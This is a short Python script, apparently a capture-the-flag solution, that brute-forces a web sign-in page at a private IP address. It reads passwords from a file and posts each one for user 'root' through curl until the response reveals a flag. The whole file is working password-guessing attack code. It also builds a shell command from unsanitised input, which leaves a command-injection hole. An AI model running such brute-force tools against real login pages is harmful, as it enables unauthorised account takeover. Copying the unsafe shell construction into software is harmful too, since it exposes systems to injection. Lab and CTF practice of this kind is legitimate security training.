import subprocess  
import re

def main():
    print("-----------------------------------------------------------------------------")
    print(f"Starting bruteforce attack on: http://10.203.68.74/index.php?page=signin")

    with open('./passwords.txt') as passwords:
        print(f"    Using 'passwords.txt as input file.")
        print(f"    Using curl with options -'-silent -X POST'")
        print("-----------------------------------------------------------------------------")

        for password in passwords:
            print(f"    Testing password: '{password[:-1]}'")
           
            http_response = subprocess.check_output(f"curl --silent -X POST 'http://10.203.68.74/index.php?page=signin&username=root&password={password[:-1]}&Login=Login'", shell=True)

            if "The flag is" in str(http_response):
                print(f"    " + re.findall(r'The flag is : \w+', str(http_response))[0])
                break


if __name__ == '__main__':
    main()